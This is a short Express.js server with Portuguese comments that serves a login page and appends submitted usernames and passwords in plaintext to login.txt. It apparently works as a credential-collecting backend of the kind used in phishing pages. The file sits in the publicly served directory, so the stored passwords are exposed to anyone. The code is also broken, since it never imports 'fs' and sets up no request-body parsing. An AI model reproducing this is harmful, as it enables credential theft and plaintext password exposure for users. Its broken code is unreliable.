const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve o arquivo index.html como o frontend
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota para processar o formulário
app.post('/submit-form', (req, res) => {
    const { username, password } = req.body;
    const loginData = `Username: ${username}, Password: ${password}\n`;

    const filePath = path.join(__dirname, 'login.txt');
    fs.appendFile(filePath, loginData, (err) => {
        if (err) {
            console.error('Erro ao salvar os dados:', err);
            return res.status(500).send('Erro no servidor');
        }
        res.send('Dados salvos com sucesso');
    });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
});
